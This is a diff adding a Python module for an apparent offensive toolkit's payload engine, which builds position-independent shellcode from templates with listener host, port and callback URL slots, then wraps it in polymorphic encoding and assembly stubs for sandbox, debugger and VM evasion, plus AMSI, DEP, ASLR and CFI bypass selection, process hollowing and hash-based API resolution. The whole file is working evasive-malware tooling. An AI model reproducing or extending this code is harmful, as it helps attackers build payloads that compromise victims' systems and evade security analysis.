@@ -1,0 +1,899 @@
+"""
+Core Payload Generation Engine
+
+Orchestrates the creation of sophisticated payloads with evasion capabilities,
+polymorphic encoding, and cross-architecture support.
+"""
+
+import hashlib
+import logging
+import random
+import time
+from typing import Any, Dict, List, Optional
+
+from ...utils.entropy_utils import calculate_byte_entropy
+from .assembly_compiler import AssemblyCompiler
+from .encoder_engine import EncoderEngine
+from .payload_types import (
+    Architecture,
+    EncodingType,
+    PayloadType,
+)
+from .polymorphic_engine import PolymorphicEngine
+
+# Import anti-analysis capabilities
+try:
+    from ..anti_analysis import (
+        APIObfuscator,
+        DebuggerDetector,
+        ProcessHollowing,
+        SandboxDetector,
+        TimingAttackDefense,
+        VMDetector,
+    )
+    ANTI_ANALYSIS_AVAILABLE = True
+except ImportError:
+    ANTI_ANALYSIS_AVAILABLE = False
+
+# Import exploit mitigation bypasses
+try:
+    from ..exploit_mitigation import CFIBypass
+    MITIGATION_BYPASS_AVAILABLE = True
+except ImportError:
+    MITIGATION_BYPASS_AVAILABLE = False
+
+logger = logging.getLogger(__name__)
+
+
+class PayloadEngine:
+    """
+    Advanced payload generation engine with intelligent optimization
+    and anti-analysis capabilities.
+    """
+
+    def __init__(self):
+        self.logger = logging.getLogger("IntellicrackLogger.PayloadEngine")
+        self.assembly_compiler = AssemblyCompiler()
+        self.polymorphic_engine = PolymorphicEngine()
+        self.encoder_engine = EncoderEngine()
+
+        # Lazy imports to avoid circular dependencies
+        self._shellcode_generator = None
+        self._payload_templates = None
+
+        # Initialize anti-analysis components
+        if ANTI_ANALYSIS_AVAILABLE:
+            self.vm_detector = VMDetector()
+            self.debugger_detector = DebuggerDetector()
+            self.sandbox_detector = SandboxDetector()
+            self.timing_defense = TimingAttackDefense()
+            self.api_obfuscator = APIObfuscator()
+            self.process_hollowing = ProcessHollowing()
+        else:
+            self.logger.warning("Anti-analysis modules not available")
+
+        # Initialize exploit mitigation bypasses
+        if MITIGATION_BYPASS_AVAILABLE:
+            self.cfi_bypass = CFIBypass()
+        else:
+            self.logger.warning("Exploit mitigation bypass modules not available")
+
+        # Payload generation statistics
+        self.stats = {
+            'payloads_generated': 0,
+            'success_rate': 0.0,
+            'avg_generation_time': 0.0,
+            'architectures_supported': len(Architecture),
+            'encoding_methods': len(EncodingType),
+            'anti_analysis_enabled': ANTI_ANALYSIS_AVAILABLE,
+            'mitigation_bypass_enabled': MITIGATION_BYPASS_AVAILABLE
+        }
+        self._successful_generations = 0
+
+    @property
+    def shellcode_generator(self):
+        """Lazy-loaded ShellcodeGenerator to avoid circular imports."""
+        if self._shellcode_generator is None:
+            from .shellcode_generator import ShellcodeGenerator
+            self._shellcode_generator = ShellcodeGenerator()
+        return self._shellcode_generator
+
+    @property
+    def payload_templates(self):
+        """Lazy-loaded PayloadTemplates to avoid circular imports."""
+        if self._payload_templates is None:
+            from .payload_templates import PayloadTemplates
+            self._payload_templates = PayloadTemplates()
+        return self._payload_templates
+
+    def generate_payload(self,
+                        payload_type: PayloadType,
+                        architecture: Architecture,
+                        target_info: Dict[str, Any],
+                        options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+        """
+        Generate an optimized payload for the specified target.
+        
+        Args:
+            payload_type: Type of payload to generate
+            architecture: Target architecture
+            target_info: Information about target system
+            options: Additional configuration options
+            
+        Returns:
+            Dictionary containing generated payload and metadata
+        """
+        start_time = time.time()
+
+        if options is None:
+            options = {}
+
+        try:
+            self.logger.info(f"Generating {payload_type.value} payload for {architecture.value}")
+
+            # Step 1: Analyze target environment for optimization
+            target_analysis = self._analyze_target_environment(target_info)
+
+            # Step 2: Select optimal payload template
+            template = self.payload_templates.get_template(
+                payload_type,
+                architecture,
+                target_analysis
+            )
+
+            # Step 3: Generate base shellcode
+            base_shellcode = self._generate_base_shellcode(
+                template,
+                target_info,
+                options
+            )
+
+            # Step 4: Apply encoding/obfuscation
+            encoded_payload = self._apply_encoding(
+                base_shellcode,
+                options.get('encoding', EncodingType.POLYMORPHIC),
+                target_analysis
+            )
+
+            # Step 5: Add anti-analysis techniques
+            final_payload = self._add_anti_analysis(
+                encoded_payload,
+                options.get('evasion_level', 'medium'),
+                target_analysis
+            )
+
+            # Step 6: Generate payload metadata
+            metadata = self._generate_metadata(
+                final_payload,
+                payload_type,
+                architecture,
+                target_analysis,
+                options
+            )
+
+            generation_time = time.time() - start_time
+            self._update_statistics(generation_time, True)
+
+            result = {
+                'success': True,
+                'payload': final_payload,
+                'metadata': metadata,
+                'generation_time': generation_time,
+                'target_analysis': target_analysis
+            }
+
+            self.logger.info(f"Payload generated successfully in {generation_time:.2f}s")
+            return result
+
+        except Exception as e:
+            generation_time = time.time() - start_time
+            self._update_statistics(generation_time, False)
+
+            self.logger.error(f"Payload generation failed: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'generation_time': generation_time
+            }
+
+    def _analyze_target_environment(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Analyze target environment for payload optimization."""
+        analysis = {
+            'os_type': target_info.get('os_type', 'unknown'),
+            'os_version': target_info.get('os_version', 'unknown'),
+            'architecture': target_info.get('architecture', 'unknown'),
+            'protections': target_info.get('protections', []),
+            'av_products': target_info.get('av_products', []),
+            'network_config': target_info.get('network_config', {}),
+            'process_info': target_info.get('process_info', {}),
+            'evasion_requirements': []
+        }
+
+        # Enhanced analysis with anti-analysis capabilities
+        if ANTI_ANALYSIS_AVAILABLE:
+            # Perform VM detection analysis
+            vm_analysis = self.vm_detector.detect_vm(aggressive=False)
+            analysis['vm_detected'] = vm_analysis['is_vm']
+            analysis['vm_type'] = vm_analysis.get('vm_type')
+
+            # Perform debugger detection analysis
+            debugger_analysis = self.debugger_detector.detect_debugger(aggressive=False)
+            analysis['debugger_detected'] = debugger_analysis['is_debugged']
+            analysis['debugger_type'] = debugger_analysis.get('debugger_type')
+
+            # Perform sandbox detection analysis
+            sandbox_analysis = self.sandbox_detector.detect_sandbox(aggressive=False)
+            analysis['sandbox_detected'] = sandbox_analysis['is_sandbox']
+            analysis['sandbox_type'] = sandbox_analysis.get('sandbox_type')
+
+            # Update evasion requirements based on analysis
+            if vm_analysis['is_vm']:
+                analysis['evasion_requirements'].append('vm_evasion')
+            if debugger_analysis['is_debugged']:
+                analysis['evasion_requirements'].append('debugger_evasion')
+            if sandbox_analysis['is_sandbox']:
+                analysis['evasion_requirements'].append('sandbox_evasion')
+
+        # Determine evasion requirements based on target
+        if 'windows_defender' in analysis['av_products']:
+            analysis['evasion_requirements'].append('amsi_bypass')
+        if 'aslr' in analysis['protections']:
+            analysis['evasion_requirements'].append('aslr_bypass')
+        if 'dep' in analysis['protections']:
+            analysis['evasion_requirements'].append('dep_bypass')
+        if 'cfg' in analysis['protections']:
+            analysis['evasion_requirements'].append('cfg_bypass')
+        if 'cfi' in analysis['protections']:
+            analysis['evasion_requirements'].append('cfi_bypass')
+
+        return analysis
+
+    def _generate_base_shellcode(self,
+                                template: Dict[str, Any],
+                                target_info: Dict[str, Any],
+                                options: Dict[str, Any]) -> bytes:
+        """Generate base shellcode from template."""
+        # Use assembly compiler to create position-independent shellcode
+        assembly_code = template['assembly_template']
+
+        # Substitute template variables
+        assembly_code = self._substitute_template_variables(
+            assembly_code,
+            target_info,
+            options
+        )
+
+        # Compile to machine code
+        shellcode = self.assembly_compiler.compile_assembly(
+            assembly_code,
+            template['architecture'],
+            position_independent=True
+        )
+
+        return shellcode
+
+    def _substitute_template_variables(self,
+                                     assembly_code: str,
+                                     target_info: Dict[str, Any],
+                                     options: Dict[str, Any]) -> str:
+        """Substitute variables in assembly template."""
+        substitutions = {
+            '{{LHOST}}': options.get('lhost', '127.0.0.1'),
+            '{{LPORT}}': str(options.get('lport', 4444)),
+            '{{CALLBACK_URL}}': options.get('callback_url', ''),
+            '{{SLEEP_TIME}}': str(options.get('sleep_time', 1000)),
+            '{{USER_AGENT}}': options.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
+            '{{ENCRYPTION_KEY}}': options.get('encryption_key', self._generate_random_key()),
+        }
+
+        for placeholder, value in substitutions.items():
+            assembly_code = assembly_code.replace(placeholder, value)
+
+        return assembly_code
+
+    def _apply_encoding(self,
+                       shellcode: bytes,
+                       encoding_type: EncodingType,
+                       target_analysis: Dict[str, Any]) -> bytes:
+        """Apply encoding/obfuscation to shellcode."""
+        if encoding_type == EncodingType.NONE:
+            return shellcode
+        elif encoding_type == EncodingType.POLYMORPHIC:
+            return self.polymorphic_engine.encode_payload(shellcode, target_analysis)
+        elif encoding_type == EncodingType.METAMORPHIC:
+            return self.polymorphic_engine.metamorphic_encode(shellcode, target_analysis)
+        else:
+            return self.encoder_engine.encode_payload(shellcode, encoding_type)
+
+    def _add_anti_analysis(self,
+                          payload: bytes,
+                          evasion_level: str,
+                          target_analysis: Dict[str, Any]) -> bytes:
+        """Add anti-analysis and evasion techniques."""
+        if evasion_level == 'none':
+            return payload
+
+        # Enhanced anti-analysis using new modules
+        if ANTI_ANALYSIS_AVAILABLE:
+            # Add advanced sandbox detection
+            if evasion_level in ['medium', 'high']:
+                payload = self._add_advanced_sandbox_detection(payload, target_analysis)
+
+            # Add advanced debugger detection
+            if evasion_level == 'high':
+                payload = self._add_advanced_debugger_detection(payload, target_analysis)
+
+            # Add advanced VM detection
+            if 'vm_evasion' in target_analysis.get('evasion_requirements', []):
+                payload = self._add_advanced_vm_detection(payload, target_analysis)
+
+            # Add API obfuscation
+            if evasion_level == 'high':
+                payload = self._add_api_obfuscation(payload)
+
+            # Add timing attack defenses
+            if 'sandbox_evasion' in target_analysis.get('evasion_requirements', []):
+                payload = self._add_timing_defenses(payload)
+        else:
+            # Fallback to basic detection methods
+            if evasion_level in ['medium', 'high']:
+                payload = self._add_sandbox_detection(payload)
+            if evasion_level == 'high':
+                payload = self._add_debugger_detection(payload)
+            if 'vm_evasion' in target_analysis.get('evasion_requirements', []):
+                payload = self._add_vm_detection(payload)
+
+        return payload
+
+    def _add_sandbox_detection(self, payload: bytes) -> bytes:
+        """Add sandbox detection code to payload."""
+        # Sandbox detection shellcode (checks for common sandbox artifacts)
+        sandbox_detection = self.assembly_compiler.compile_assembly("""
+            ; Check for common sandbox usernames
+            call get_username
+            mov eax, esp
+            mov ebx, 'sand'
+            cmp [eax], ebx
+            je exit_payload
+            
+            ; Check for sandbox process names
+            call get_process_list
+            mov eax, esp
+            mov ebx, 'vmwa'
+            cmp [eax], ebx
+            je exit_payload
+            
+            ; Sleep and time check (sandbox often fast-forwards)
+            call GetTickCount
+            mov ebx, eax
+            push 1000
+            call Sleep
+            call GetTickCount
+            sub eax, ebx
+            cmp eax, 800
+            jl exit_payload
+            
+            jmp main_payload
+            
+            exit_payload:
+                xor eax, eax
+                ret
+                
+            main_payload:
+        """, Architecture.X86)
+
+        return sandbox_detection + payload
+
+    def _add_debugger_detection(self, payload: bytes) -> bytes:
+        """Add debugger detection code to payload."""
+        debugger_detection = self.assembly_compiler.compile_assembly("""
+            ; Check PEB BeingDebugged flag
+            mov eax, fs:[0x30]  ; PEB
+            mov al, [eax + 0x02] ; BeingDebugged flag
+            test al, al
+            jnz exit_payload
+            
+            ; Check for hardware breakpoints
+            xor eax, eax
+            mov dr0, eax
+            mov eax, dr0
+            test eax, eax
+            jnz exit_payload
+            
+            ; Check for software breakpoints
+            call check_int3
+            test eax, eax
+            jnz exit_payload
+            
+            jmp main_payload
+            
+            exit_payload:
+                xor eax, eax
+                ret
+                
+            main_payload:
+        """, Architecture.X86)
+
+        return debugger_detection + payload
+
+    def _add_vm_detection(self, payload: bytes) -> bytes:
+        """Add VM detection code to payload."""
+        vm_detection = self.assembly_compiler.compile_assembly("""
+            ; Check for VMware
+            mov eax, 'VMXh'
+            mov ebx, 0
+            mov ecx, 10
+            mov edx, 'VX'
+            in eax, dx
+            cmp ebx, 'VMXh'
+            je exit_payload
+            
+            ; Check for VirtualBox
+            sidt [esp-2]
+            mov eax, [esp]
+            shr eax, 24
+            cmp al, 0xFF
+            je exit_payload
+            
+            jmp main_payload
+            
+            exit_payload:
+                xor eax, eax
+                ret
+                
+            main_payload:
+        """, Architecture.X86)
+
+        return vm_detection + payload
+
+    def _generate_metadata(self,
+                          payload: bytes,
+                          payload_type: PayloadType,
+                          architecture: Architecture,
+                          target_analysis: Dict[str, Any],
+                          options: Dict[str, Any]) -> Dict[str, Any]:
+        """Generate comprehensive payload metadata."""
+        return {
+            'payload_id': hashlib.sha256(payload).hexdigest()[:16],
+            'payload_type': payload_type.value,
+            'architecture': architecture.value,
+            'size_bytes': len(payload),
+            'entropy': calculate_byte_entropy(payload),
+            'hash_md5': hashlib.md5(payload).hexdigest(),
+            'hash_sha256': hashlib.sha256(payload).hexdigest(),
+            'encoding_applied': options.get('encoding', 'polymorphic'),
+            'evasion_level': options.get('evasion_level', 'medium'),
+            'target_os': target_analysis.get('os_type', 'unknown'),
+            'bad_chars': self._find_bad_characters(payload),
+            'null_bytes': payload.count(b'\x00'),
+            'generation_timestamp': time.time(),
+            'compatibility_score': self._calculate_compatibility_score(payload, target_analysis)
+        }
+
+
+    def _find_bad_characters(self, payload: bytes) -> List[int]:
+        """Find potentially problematic characters in payload."""
+        bad_chars = []
+        common_bad_chars = [0x00, 0x0A, 0x0D, 0x20, 0xFF]
+
+        for bad_char in common_bad_chars:
+            if bad_char in payload:
+                bad_chars.append(bad_char)
+
+        return bad_chars
+
+    def _calculate_compatibility_score(self,
+                                     payload: bytes,
+                                     target_analysis: Dict[str, Any]) -> float:
+        """Calculate compatibility score based on target analysis."""
+        score = 1.0
+
+        # Reduce score for bad characters
+        bad_chars = self._find_bad_characters(payload)
+        score -= len(bad_chars) * 0.1
+
+        # Reduce score for null bytes
+        null_count = payload.count(b'\x00')
+        score -= null_count * 0.01
+
+        # Adjust for target protections
+        protections = target_analysis.get('protections', [])
+        if 'dep' in protections:
+            score -= 0.1
+        if 'aslr' in protections:
+            score -= 0.1
+        if 'cfg' in protections:
+            score -= 0.2
+
+        return max(0.0, min(1.0, score))
+
+    def _generate_random_key(self, length: int = 32) -> str:
+        """Generate random encryption key."""
+        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        return ''.join(random.choice(chars) for _ in range(length))
+
+    def _update_statistics(self, generation_time: float, success: bool):
+        """Update payload generation statistics."""
+        self.stats['payloads_generated'] += 1
+
+        if success:
+            # Update rolling average
+            current_avg = self.stats['avg_generation_time']
+            count = self.stats['payloads_generated']
+            self.stats['avg_generation_time'] = (current_avg * (count - 1) + generation_time) / count
+
+        # Calculate success rate
+        if hasattr(self, '_successful_generations'):
+            if success:
+                self._successful_generations += 1
+        else:
+            self._successful_generations = 1 if success else 0
+
+        self.stats['success_rate'] = self._successful_generations / self.stats['payloads_generated']
+
+    def get_statistics(self) -> Dict[str, Any]:
+        """Get payload generation statistics."""
+        return self.stats.copy()
+
+    def list_supported_architectures(self) -> List[str]:
+        """Get list of supported target architectures."""
+        return [arch.value for arch in Architecture]
+
+    def list_payload_types(self) -> List[str]:
+        """Get list of supported payload types."""
+        return [ptype.value for ptype in PayloadType]
+
+    def list_encoding_methods(self) -> List[str]:
+        """Get list of available encoding methods."""
+        return [enc.value for enc in EncodingType]
+
+    # Advanced anti-analysis methods using new modules
+
+    def _add_advanced_sandbox_detection(self, payload: bytes, target_analysis: Dict[str, Any]) -> bytes:
+        """Add advanced sandbox detection using SandboxDetector module."""
+        if not ANTI_ANALYSIS_AVAILABLE:
+            return payload
+
+        try:
+            # Log target analysis for debugging
+            self.logger.debug(f"Applying sandbox detection for target: {target_analysis.get('os_type', 'unknown')}")
+
+            # Generate sandbox evasion code based on target analysis
+            evasion_options = {
+                'target_os': target_analysis.get('os_type', 'unknown'),
+                'detected_sandbox': target_analysis.get('sandbox_type', None)
+            }
+            evasion_code = self.sandbox_detector.generate_sandbox_evasion()
+            self.logger.debug(f"Generated evasion code with options: {evasion_options}")
+            self.logger.debug(f"Generated evasion code length: {len(evasion_code) if evasion_code else 0} bytes")
+
+            # Customize detection based on target analysis
+            sleep_time = 5000
+            detection_methods = []
+
+            # Adapt detection methods based on target environment
+            if target_analysis.get('sandbox_detected'):
+                self.logger.info(f"Sandbox already detected: {target_analysis.get('sandbox_type', 'unknown')}")
+                sleep_time = 10000  # Increase sleep time for known sandbox
+                detection_methods.append('timing_check')
+
+            if 'cuckoo' in target_analysis.get('sandbox_type', '').lower():
+                detection_methods.append('cuckoo_specific')
+            elif 'vmware' in target_analysis.get('vm_type', '').lower():
+                detection_methods.append('vmware_specific')
+
+            # Apply AV-specific evasion if detected
+            av_products = target_analysis.get('av_products', [])
+            if av_products:
+                self.logger.debug(f"Adapting for AV products: {av_products}")
+                detection_methods.append('av_evasion')
+
+            # Convert C code to assembly (simplified)
+            # In practice, would need proper C-to-assembly compiler
+            sandbox_asm = f"""
+                ; Advanced sandbox detection for {target_analysis.get('os_type', 'unknown')}
+                call detect_sandbox
+                test eax, eax
+                jnz exit_payload
+                
+                ; Sleep with anti-acceleration (adapted: {sleep_time}ms)
+                push {sleep_time}
+                call secure_sleep
+                test eax, eax
+                jz exit_payload
+                
+                jmp main_payload
+                
+                exit_payload:
+                    xor eax, eax
+                    ret
+                    
+                main_payload:
+            """
+
+            sandbox_detection = self.assembly_compiler.compile_assembly(
+                sandbox_asm, Architecture.X86
+            )
+
+            # Log successful adaptation
+            self.logger.debug(f"Applied sandbox detection methods: {detection_methods}")
+
+            return sandbox_detection + payload
+
+        except Exception as e:
+            self.logger.warning(f"Advanced sandbox detection failed: {e}")
+            return payload
+
+    def _add_advanced_debugger_detection(self, payload: bytes, target_analysis: Dict[str, Any]) -> bytes:
+        """Add advanced debugger detection using DebuggerDetector module."""
+        if not ANTI_ANALYSIS_AVAILABLE:
+            return payload
+
+        try:
+            # Log target analysis for debugging
+            target_os = target_analysis.get('os_type', 'unknown')
+            target_arch = target_analysis.get('architecture', 'unknown')
+            self.logger.debug(f"Applying debugger detection for {target_os} on {target_arch}")
+
+            # Generate anti-debugging code based on target analysis
+            antidebug_options = {
+                'target_os': target_os,
+                'target_arch': target_arch,
+                'detected_debugger': target_analysis.get('debugger_type', None)
+            }
+            antidebug_code = self.debugger_detector.generate_antidebug_code()
+            self.logger.debug(f"Generated anti-debug code with options: {antidebug_options}")
+            self.logger.debug(f"Generated anti-debug code length: {len(antidebug_code) if antidebug_code else 0} bytes")
+
+            # Customize detection based on target environment
+            detection_methods = ['is_being_debugged', 'rdtsc_timing_check']
+            response_strategy = 'crash_debugger'
+
+            # Adapt based on detected debugger
+            if target_analysis.get('debugger_detected'):
+                debugger_type = target_analysis.get('debugger_type', 'unknown')
+                self.logger.info(f"Debugger already detected: {debugger_type}")
+
+                # Apply specific countermeasures based on debugger type
+                if 'ollydbg' in debugger_type.lower():
+                    detection_methods.append('ollydbg_specific')
+                    response_strategy = 'ollydbg_crash'
+                elif 'windbg' in debugger_type.lower():
+                    detection_methods.append('windbg_specific')
+                    response_strategy = 'windbg_evasion'
+                elif 'x64dbg' in debugger_type.lower():
+                    detection_methods.append('x64dbg_specific')
+
+            # OS-specific detection methods
+            if target_os.lower() == 'windows':
+                detection_methods.extend(['peb_check', 'heap_flags'])
+            elif target_os.lower() == 'linux':
+                detection_methods.extend(['ptrace_check', 'proc_status'])
+
+            # Architecture-specific optimizations
+            arch_suffix = 'x64' if '64' in target_arch else 'x86'
+            self.logger.debug(f"Using architecture suffix: {arch_suffix}")
+
+            # Convert to assembly (simplified)
+            debugger_asm = f"""
+                ; Advanced debugger detection for {target_os} ({target_arch})
+                ; Methods: {', '.join(detection_methods)}
+                call is_being_debugged
+                test eax, eax
+                jnz handle_debugger
+                
+                ; Check for timing anomalies
+                call rdtsc_timing_check
+                test eax, eax
+                jz handle_debugger
+                
+                jmp main_payload
+                
+                handle_debugger:
+                    ; Response strategy: {response_strategy}
+                    call {response_strategy}
+                    jmp infinite_loop
+                    
+                infinite_loop:
+                    jmp infinite_loop
+                    
+                main_payload:
+            """
+
+            # Use appropriate architecture for compilation
+            compile_arch = Architecture.X64 if '64' in target_arch else Architecture.X86
+            debugger_detection = self.assembly_compiler.compile_assembly(
+                debugger_asm, compile_arch
+            )
+
+            # Log applied methods
+            self.logger.debug(f"Applied debugger detection methods: {detection_methods}")
+            self.logger.debug(f"Using response strategy: {response_strategy}")
+
+            return debugger_detection + payload
+
+        except Exception as e:
+            self.logger.warning(f"Advanced debugger detection failed: {e}")
+            return payload
+
+    def _add_advanced_vm_detection(self, payload: bytes, target_analysis: Dict[str, Any]) -> bytes:
+        """Add advanced VM detection using VMDetector module."""
+        if not ANTI_ANALYSIS_AVAILABLE:
+            return payload
+
+        try:
+            # Log target analysis for VM optimization
+            target_os = target_analysis.get('os_type', 'unknown')
+            vm_detected = target_analysis.get('vm_detected', False)
+            vm_type = target_analysis.get('vm_type', 'unknown')
+            self.logger.debug(f"Applying VM detection for {target_os}, VM status: {vm_detected}")
+
+            # Generate VM evasion code based on target analysis
+            vm_evasion_options = {
+                'target_os': target_os,
+                'vm_type': vm_type,
+                'vm_detected': vm_detected
+            }
+            evasion_code = self.vm_detector.generate_evasion_code()
+            self.logger.debug(f"Generated VM evasion code with options: {vm_evasion_options}")
+            self.logger.debug(f"Generated VM evasion code length: {len(evasion_code) if evasion_code else 0} bytes")
+
+            # Customize detection based on target analysis
+            detection_methods = ['is_running_in_vm', 'check_cpu_features']
+            evasion_strategy = 'benign_exit'
+
+            # Adapt based on detected VM environment
+            if vm_detected:
+                self.logger.info(f"VM already detected: {vm_type}")
+
+                # Apply VM-specific detection methods
+                if 'vmware' in vm_type.lower():
+                    detection_methods.extend(['vmware_backdoor', 'vmware_registry'])
+                    evasion_strategy = 'vmware_specific_exit'
+                elif 'virtualbox' in vm_type.lower():
+                    detection_methods.extend(['vbox_guest_additions', 'vbox_devices'])
+                    evasion_strategy = 'vbox_specific_exit'
+                elif 'hyperv' in vm_type.lower():
+                    detection_methods.extend(['hyperv_cpuid', 'hyperv_services'])
+                    evasion_strategy = 'hyperv_specific_exit'
+                elif 'qemu' in vm_type.lower():
+                    detection_methods.extend(['qemu_devices', 'qemu_registry'])
+                    evasion_strategy = 'qemu_specific_exit'
+
+            # OS-specific VM detection methods
+            if target_os.lower() == 'windows':
+                detection_methods.extend(['wmi_checks', 'registry_artifacts'])
+            elif target_os.lower() == 'linux':
+                detection_methods.extend(['proc_checks', 'dmi_info'])
+
+            # Use evasion requirements to determine behavior
+            evasion_reqs = target_analysis.get('evasion_requirements', [])
+            if 'vm_evasion' in evasion_reqs:
+                self.logger.debug("VM evasion explicitly required")
+                evasion_strategy = 'stealth_mode'
+
+            # Convert to assembly
+            vm_asm = f"""
+                ; Advanced VM detection for {target_os}
+                ; VM Type: {vm_type}, Strategy: {evasion_strategy}
+                ; Methods: {', '.join(detection_methods)}
+                call is_running_in_vm
+                test eax, eax
+                jnz vm_detected
+                
+                ; Additional checks based on target analysis
+                call check_cpu_features
+                test eax, eax
+                jnz vm_detected
+                
+                jmp main_payload
+                
+                vm_detected:
+                    ; Evasion strategy: {evasion_strategy}
+                    push 0
+                    push offset benign_msg
+                    push offset benign_title
+                    push 0
+                    call MessageBoxA
+                    
+                    push 0
+                    call ExitProcess
+                    
+                main_payload:
+            """
+
+            vm_detection = self.assembly_compiler.compile_assembly(
+                vm_asm, Architecture.X86
+            )
+
+            # Log applied techniques
+            self.logger.debug(f"Applied VM detection methods: {detection_methods}")
+            self.logger.debug(f"Using evasion strategy: {evasion_strategy}")
+
+            return vm_detection + payload
+
+        except Exception as e:
+            self.logger.warning(f"Advanced VM detection failed: {e}")
+            return payload
+
+    def _add_api_obfuscation(self, payload: bytes) -> bytes:
+        """Add API obfuscation using APIObfuscator module."""
+        if not ANTI_ANALYSIS_AVAILABLE:
+            return payload
+
+        try:
+            # Generate hash-based API resolution code
+            api_code = self.api_obfuscator._generate_hash_lookup_code()
+
+            # This would prepend API resolution code to payload
+            # Simplified implementation
+            api_asm = """
+                ; Hash-based API resolution
+                call resolve_apis
+                test eax, eax
+                jz exit_payload
+                
+                jmp main_payload
+                
+                resolve_apis:
+                    ; Resolve APIs by hash
+                    push 0x7C0DFCAA  ; VirtualAlloc hash
+                    call resolve_api_hash
+                    mov [virtualalloc_ptr], eax
+                    
+                    ret
+                    
+                main_payload:
+            """
+
+            api_obfuscation = self.assembly_compiler.compile_assembly(
+                api_asm, Architecture.X86
+            )
+
+            return api_obfuscation + payload
+
+        except Exception as e:
+            self.logger.warning(f"API obfuscation failed: {e}")
+            return payload
+
+    def _add_timing_defenses(self, payload: bytes) -> bytes:
+        """Add timing attack defenses using TimingAttackDefense module."""
+        if not ANTI_ANALYSIS_AVAILABLE:
+            return payload
+
+        try:
+            # Generate timing defense code
+            timing_code = self.timing_defense.generate_timing_defense_code()
+
+            # Convert to assembly
+            timing_asm = """
+                ; Timing attack defenses
+                call execution_delay
+                
+                ; Stall execution
+                push 2000
+                call stall_execution
+                
+                ; Verify timing integrity
+                call secure_sleep_check
+                test eax, eax
+                jz exit_payload
+                
+                jmp main_payload
+                
+                exit_payload:
+                    xor eax, eax
+                    ret
+                    
+                main_payload:
+            """
+
+            timing_defenses = self.assembly_compiler.compile_assembly(
+                timing_asm, Architecture.X86
+            )
+
+            return timing_defenses + payload
+
+        except Exception as e:
+            self.logger.warning(f"Timing defenses failed: {e}")
+            return payload
